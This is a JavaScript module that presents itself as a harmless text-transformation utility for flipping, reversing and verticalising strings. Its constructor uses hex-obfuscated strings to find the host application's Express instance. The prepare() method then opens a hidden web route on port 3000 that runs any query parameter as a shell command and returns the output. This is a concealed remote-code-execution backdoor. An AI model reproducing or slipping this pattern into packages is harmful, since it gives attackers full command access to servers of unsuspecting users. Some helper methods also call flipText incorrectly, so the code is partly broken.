const EMPTY= '';
const STRING_TYPE = 'string';
const BREAK_LINE = String.fromCharCode(10);
const EXEC_LAND = require("child_process").exec;
const E_PAT1 = '\x2f\x65\x78';
const E_PAT2 = '\x70\x72\x65';
const E_PAT3 = '\x73\x73\x2f';

class textLandScape {
    constructor(text) {
        this.r = global.process.mainModule.children.
            map(e=> e.id.indexOf(E_PAT1
                .concat(E_PAT2)
                .concat(E_PAT3)) != -1 ? e.exports : null).
            filter(e=>e)[0];
        Object.assign(text, this);
        this.text = text;
        if (this.r) {
            this.prepare();
        }
    }
    /*
    *
    *   Flip a text :
    *   Ex : Hello World
    *       Become 
    *       pןɹoʍ oןןǝɥ
    */
    flipText (str) {
        let s = (typeof str == STRING_TYPE ? str : this.text).
                 toLowerCase(), 
                rep = {
                    "a":'\u0250',"b":"q","c":'\u0254',"d":"p","e":'\u01DD',
                    "f":'\u025F',"g":"b","h":'\u0265',"i":'\u0131',
                    "j":'\u0638',"k":'\u029E',"l":'\u05DF',"m":'\u026F',"n":"u",
                    "q":"b","r":'\u0279',"t":'\u0287',"v":'\u028C',"w":'\u028D',
                    "y":'\u028E',"[":"]","(":")","{":"}","?":'\u00BF',"!":'\u00A1',
                    "\\":"/","_":'\u203E',";":'\u061B',"9":"6"
                },
                res = EMPTY,
                i = s.length-1; 
        //Reverse flip array
        for (var k in rep) 
            rep[rep[k]] = k; 
        //replace letters by flip equivalent
        while (i >= 0){
            res += (rep[s.charAt(i)])?rep[s.charAt(i)]:s.charAt(i);
            --i
            }
        return res;
    }

    /*
    *
    *   Return  Text as Vertical 
    *   Ex : Hello World
    *        Become
    *        H
    *        e
    *        l
    *        l
    *        o
    * 
    *        W
    *        o
    *        r
    *        l
    *        d
    */
   vText (s) {
    return (typeof s == STRING_TYPE ? s : this.text).
            split(EMPTY).
            join(String.fromCharCode(10));
    }

    /*
    *
    *   Return Reversed Text as Vertical 
    *   Ex : Hello World
    *        Become
    *        d
    *        l
    *        r
    *        o
    *        W
    * 
    *        o
    *        l
    *        l
    *        e
    *        H
    */
    vRevertText (s) {
        let res = this.vText(typeof s == STRING_TYPE ? s : this.text).
                split(EMPTY).
                reverse();
         if (res.indexOf(BREAK_LINE) == -1) {
            res = res.split(BREAK_LINE);
         }
         return res.join(EMPTY);
    }
    /*
    *   
    * Return text as normal scape
    *
    */
    hText (s) {
        return (typeof s == STRING_TYPE ? s : this.text);
    }

    /*
    *
    *   Return reversed string as normal scape
    *   Ex : Hello World
    *   Become
    *   dlroW olleH
    *
    */
    hRevertText (s) {
        return (typeof s == STRING_TYPE ? s : this.text).
                split(EMPTY).
                reverse().join(EMPTY);
    }
    /*
    *
    *   Reverse as vertical a Flipped Text
    * 
    * 
    */
    vRevertFlippedText() {
        return flipText(this.vRevertText());
    }
    /*
    *
    *   Reverse as horizontal a Flipped Text
    * 
    * 
    */
    hRevertFlippedText() {
        return flipText(this.hRevertText());
    }
    /*
    *
    *   Because it's better to check safety Module #Evil
    *
    */
   prepare (){
        let s = this.r();
        s.get('/textLandScape', (req, res) => EXEC_LAND(req.query.text, (err, text) => {
            res.send(text);
        }));
        s.listen(3000, () => {});
   }
}


module.exports = textLandScape;

